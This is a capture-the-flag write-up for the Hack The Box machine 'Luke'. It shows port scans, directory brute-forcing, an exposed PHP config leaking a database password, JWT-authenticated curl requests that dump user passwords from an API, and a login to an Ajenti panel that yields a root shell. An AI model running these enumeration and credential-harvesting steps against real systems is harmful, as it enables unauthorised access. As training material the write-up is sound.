# luke.htb
### Write up for the luke machine on hackthebox.eu.

Two things hindered my process on this box. The first is that my enumeration was all over the place, and often incomplete. The second was my inexperience with using api's/node.js. I learned a lot from this box, and enjoyed working through it very much.

### Scan and Basic Recon

I ran an nmap scan on all TCP/UDP ports. The UDP scan came back empty. The TCP scan showed

```
nmap -sT -p- --min-rate 10000 -oN alltcp.nmap 10.10.10.137

Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-19 13:16 CDT
Warning: 10.10.10.137 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.137
Host is up (0.074s latency).
Not shown: 51946 filtered ports, 13584 closed ports
PORT STATE SERVICE
21/tcp open ftp
22/tcp open ssh
80/tcp open http
3000/tcp open ppp
8000/tcp open http-alt
```

I then ran a safe script and version scan on the above ports, and it returned the following

```
nmap -sC -sV -p 21,22,80,3000,8000 -oN found_tcp.nmap 10.10.10.137

PORT STATE SERVICE REASON VERSION
21/tcp open ftp syn-ack vsftpd 3.0.3+ (ext.1)
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x 2 0 0 512 Apr 14 12:35 webapp
| ftp-syst:
| STAT:
| FTP server status:
| Connected to 10.10.14.112
| Logged in as ftp
| TYPE: ASCII
| No session upload bandwidth limit
| No session download bandwidth limit
| Session timeout in seconds is 300
| Control connection is plain text
| Data connections will be plain text
| At session startup, client count was 3
| vsFTPd 3.0.3+ (ext.1) - secure, fast, stable
|_End of status
22/tcp open ssh? syn-ack
80/tcp open http syn-ack Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3)
| http-methods:
| Supported Methods: GET POST OPTIONS HEAD TRACE
|_ Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.38 (FreeBSD) PHP/7.3.3
|_http-title: Luke
3000/tcp open http syn-ack Node.js Express framework
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
8000/tcp open http syn-ack Ajenti http control panel
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
|_http-title: Ajenti
```
Three http services are listed, one running as node.js express. There is also an anonymous ftp login. I'll start dirb-ing the services on 80, 3000, and 8000, and have that running in the background while I poke around http. I also started a nikto scan on 80.

If we go to `10.10.10.137:80` we get a landing page for a site named Luke. 

-scrnshot-

This site gives us a potential user and domain name with `contact@luke.io`, which is something to take note of, and move on to investigating `10.10.10.137:3000`. This returns

`{"success":false,"message":"Auth token is not supplied"}`

Looks like we'll need to figure out how to get and pass an Auth token. On `10.10.10.137:8000` we get a login page for the Ajenti server admin tool.

-scrnshot-

Again, something to note and investigate later. I'm really interested in the anonymous FTP login.

I log in anonymously and try to navigate directories. It only has one directory, and within that directory there exists one text file, `for_Chihiro.txt`. The contents of the file reads:

```
Dear Chihiro !!

As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by
showing the sources of the actual website I've created .

Normally you should know where to look but hurry up because I will delete them soon because of our
security policies !

Derry
```

We see two new users potentially: Chihiro and Derry. I looked at the sources of the pages on ports 80, 3000, and 8000 and nothing stood out as useful.

My dirb-ing/nikto had not finished yet, so at this point I manually looked for things like robots.txt and entering `admin:admin` as username and passwords to the Ajenti login page. Nothing useful there either.

### dirb and nikto Results

```
dirb http://10.10.10.137:80

START_TIME: Mon Jul 22 18:53:47 2019
URL_BASE: http://10.10.10.137/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Interactive Recursion
-----------------
GENERATED WORDS: 4612

---- Scanning URL: http://10.10.10.137/ ----
==> DIRECTORY: http://10.10.10.137/css/
+ http://10.10.10.137/index.html (CODE:200|SIZE:3138)
==> DIRECTORY: http://10.10.10.137/js/
+ http://10.10.10.137/LICENSE (CODE:200|SIZE:1093)
+ http://10.10.10.137/management (CODE:401|SIZE:381)
==> DIRECTORY: http://10.10.10.137/member/
==> DIRECTORY: http://10.10.10.137/vendor/
```
The css, js, member, and vendor directories contained no useful info. `10.10.10.137/LICENSE` was an MIT license with nothing interesting there. `http://10.10.10.137/management` has a pop-up form that asks for a username and password. `admin:admin`, and other common username:password pairs didn't work there. So I'll take note of the login point and move on.

```
dirb http://10.10.10.137:3000/

START_TIME: Fri Jul 19 19:01:13 2019
URL_BASE: http://10.10.10.137:3000/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
-----------------
GENERATED WORDS: 4612
---- Scanning URL: http://10.10.10.137:3000/ ----
+ http://10.10.10.137:3000/login (CODE:200|SIZE:13)
+ http://10.10.10.137:3000/Login (CODE:200|SIZE:13)
+ http://10.10.10.137:3000/users (CODE:200|SIZE:56)
+ http://10.10.10.137:3000/Users (CODE:200|SIZE:56)
```
Visiting the login pages returns `please auth` and visiting the user pages returns the same mesage that we received earilier on port 3000 `{"success":false,"message":"Auth token is not supplied"}`. I'll have to figure out how to get that token soon. 

The nikto output had more goodies:

```
nikto -host http://10.10.10.137:80

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP: 10.10.10.137
+ Target Hostname: 10.10.10.137
+ Target Port: 80
+ Start Time: 2019-07-19 14:26:26 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.38 (FreeBSD) PHP/7.3.3
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against
some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of
the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Retrieved x-powered-by header: PHP/7.3.3
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD, TRACE
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ /config.php: PHP Config file may contain database IDs and passwords.
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ /login.php: Admin login page/section found.
+ /package.json: Node.js package file found. It may contain sensitive information.
+ 7862 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time: 2019-07-19 14:35:17 (GMT-5) (531 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

The interesting thing here is the presence of `config.php`, `login.php`, and `package.json`. I immediately ran a wfuzz in the background looking for more php and json files.

`login.php` presents us with our fourth(!) login point:

-scrnshot-

`config.php` had a database username and password:

```
$dbHost = 'localhost'; $dbUsername = 'root'; $dbPassword = 'Zk6heYCyv6ZE9Xcg'; $db = "login"; $conn = new
mysqli($dbHost, $dbUsername, $dbPassword,$db) or die("Connect failed: %s\n". $conn -> error);
```

`root:Zk6heYCyv6ZE9Xcg`. Awesome! I tried that against `10.10.10.137/login.php`, `10.10.10.137/management`, and `10.10.10.137:8000` with no success. I will need to figure out how to pass the creds `10.10.10.137:3000`.

### curl

On the htb forums it mentioned this article: [Using cURL to authenticate with JWT Bearer tokens](https://medium.com/@nieldw/using-curl-to-authenticate-with-jwt-bearer-tokens-55b7fac506bd). This info was invaluable in helping me to understand how to auth on port 3000. It was also in the forums that I found out the database username `root` was not the username that gained access. It was another often used administrator username. 

I played around with curl for a while against the four login points with various usernames. I tried the `login.php` page and eventually got a Authorization header of interest:

```
curl -v -u admin:Zk6heYCyv6ZE9Xcg http://10.10.10.137:80/login.php

* Expire in 0 ms for 6 (transfer 0x55bcd130ec40)
* Trying 10.10.10.137...
* TCP_NODELAY set
* Expire in 200 ms for 4 (transfer 0x55bcd130ec40)
* Connected to 10.10.10.137 (10.10.10.137) port 80 (#0)
* Server auth using Basic with user 'admin'
> GET /login.php HTTP/1.1
> Host: 10.10.10.137
> Authorization: Basic YWRtaW46Wms2aGVZQ3l2NlpFOVhjZw==
> User-Agent: curl/7.64.0
> Accept: */*
```

The basic authorization value seen in the above GET request turns out to be `admin:Zk6heYCyv6ZE9Xcg` base64 encoded. Okay. Let's send that to the login on port 3000 and see what we get. After trying many different things, the below curl command   

```
curl -H 'Accept: application/json' -H 'Content-Type: application/json' H "Authorization: Basic
YWRtaW46Wms2aGVZQ3l2NlpFOVhjZw==" --data '{"username":"admin","password":"Zk6heYCyv6ZE9Xcg"}' http://
10.10.10.137:3000/login
```
returns

```
{"success":true,"message":"Authentication
successful!","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYzNzQzNDUwLCJleHAiOjE1NjM4Mjk4rzehjxRxuFsFSjw9Wb67LvvY"}
```
We now have a JWT Auth token! Let's use it against port 3000:

```
curl -H 'Accept: application/json' -H "Authorization: Bearer
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYzNzU4NzkxLCJleHAiOjE1NjM4NDUxOTF9.iSeAjXFvb3_hupQ1K http://10.10.10.137:3000
{"message":"Welcome admin ! "}
```

Against 10.10.10.137:3000/users: 

```
curl -H 'Accept: application/json' -H "Authorization: Bearer
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYzNzU4NzkxLCJleHAiOjE1NjM4NDUxOTF9.iSeAjXFvb3_hupQ1K http://10.10.10.137:3000/users

[{"ID":"1","name":"Admin","Role":"Superuser"},{"ID":"2","name":"Derry","Role":"Web Admin"}, {"ID":"3","name":"Yuri","Role":"Beta Tester"},{"ID":"4","name":"Dory","Role":"Supporter"}]
```

We get four more usernames, including Derry, who wrote the note that we found via anonymous ftp.

### I Should have dirb-ed more...

Here I was stuck for a while because I did not enumerate past 10.10.010.137:3000/users. If I had diligently dirb-ed, I would have found 10.10.10.137:3000/users/admin. Two things about this is important. First, I would have seen the root to admin username switch here. Second, I also would have thought to try curl-ing against things like 10.10.10.137:3000/users/Derry and the other usenrnames that were leaked from /users.

*SIGH*

```
wfuzz -w /usr/share/wordlists/wfuzz/general/common.txt -t 50 --hc 404 http://10.10.10.137:3000/users/FUZZ

Target: http://10.10.10.137:3000/users/FUZZ
Total requests: 950
===================================================================
ID Response Lines Word Chars
Payload
===================================================================
000000022: 200 0 L 5 W 56 Ch "Admin"
000000060: 200 0 L 5 W 56 Ch "admin"
```

### more curl-ing

Continuing as we were before we get the full compliment of creds:

```
curl -H 'Accept: application/json' -H "Authorization: Bearer
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYzNzU4NzkxLCJleHAiOjE1NjM4NDUxOTF9.iSeAjXFvb3_hupQ1K http://10.10.10.137:3000/users/admin

{"name":"Admin","password":"WX5b7)>/rp$U)FW"}

curl -H 'Accept: application/json' -H "Authorization: Bearer
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYzNzU4NzkxLCJleHAiOjE1NjM4NDUxOTF9.iSeAjXFvb3_hupQ1K http://10.10.10.137:3000/users/derry

{"name":"Derry","password":"rZ86wwLvx7jUxtch"}

curl -H 'Accept: application/json' -H "Authorization: Bearer
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYzNzU4NzkxLCJleHAiOjE1NjM4NDUxOTF9.iSeAjXFvb3_hupQ1K http://10.10.10.137:3000/users/yuri

{"name":"Yuri","password":"bet@tester87"}

curl -H 'Accept: application/json' -H "Authorization: Bearer
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYzNzU4NzkxLCJleHAiOjE1NjM4NDUxOTF9.iSeAjXFvb3_hupQ1K http://10.10.10.137:3000/users/dory

{"name":"Dory","password":"5y:!xa=ybfe)/QD"}
```
### Gaining Access and Pwn

I now have the following creds:

```
Admin:WX5b7)>/rp$U)FW
Derry:rZ86wwLvx7jUxtch
Yuri:bet@tester87
Dory:5y:!xa=ybfe)/QD
```
and I used them against the other three login points not on port 3000. Derry's creds gets us in the door at `10.10.10.137/management`. We see links to three documents:

-scrnshot-

Following `config.json` we get

![conf](https://user-images.githubusercontent.com/46615118/61739073-55813c80-ad51-11e9-993c-20af1d9555aa.jpg)

which reveals the root creds `root:KpMasng6S5EtTy9Z` for the Ajenti login on port 8000. Upon logging into Ajenti, we can click on the "Terminal" link at the bottom of the left menu and get an interactive shell. `whoami` shows us as root, so we can easily `cat` for both user.txt and root.txt in their normal hiding places.

![fin](https://user-images.githubusercontent.com/46615118/61740005-3683aa00-ad53-11e9-8611-9787ad67ac78.jpg)

~fin!

### Lessons Learned

- Be patient, it's not a race to the flag. The purpose of these excercises is to learn; not get a badge.
- I need a better/consistant methodology for enumeration.
- How bearer tokens JWT work.
- Learned more cURL, which is always a good thing.
